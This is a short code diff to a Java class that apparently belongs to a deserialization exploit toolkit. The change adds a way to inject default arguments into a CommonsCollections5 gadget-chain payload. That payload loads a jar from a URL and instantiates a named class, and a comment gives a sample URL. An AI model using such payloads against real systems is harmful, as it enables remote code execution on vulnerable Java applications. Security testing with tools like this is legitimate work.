@@ -18,6 +18,8 @@ import org.apache.commons.collections.map.LazyMap;
  */
 public class CommonsCollections5ForLoadJar implements Payload {
 
+  private String[] args;
+
   /**
    *
    * @param args
@@ -30,6 +32,8 @@ public class CommonsCollections5ForLoadJar implements Payload {
    */
   @Override
   public Object getPayload(String[] args) throws Exception {
+    if (this.args != null)
+      args = this.args;
     // http://127.0.0.1:8080/R.jar Cmd
     String payloadUrl = args[0];
     String className = args[1];
@@ -73,4 +77,10 @@ public class CommonsCollections5ForLoadJar implements Payload {
         transformers); // arm with actual transformer chain
     return val;
   }
+
+  @Override
+  public void injectDefaultArgs(String[] args) {
+    this.args = args;
+  }
+
 }
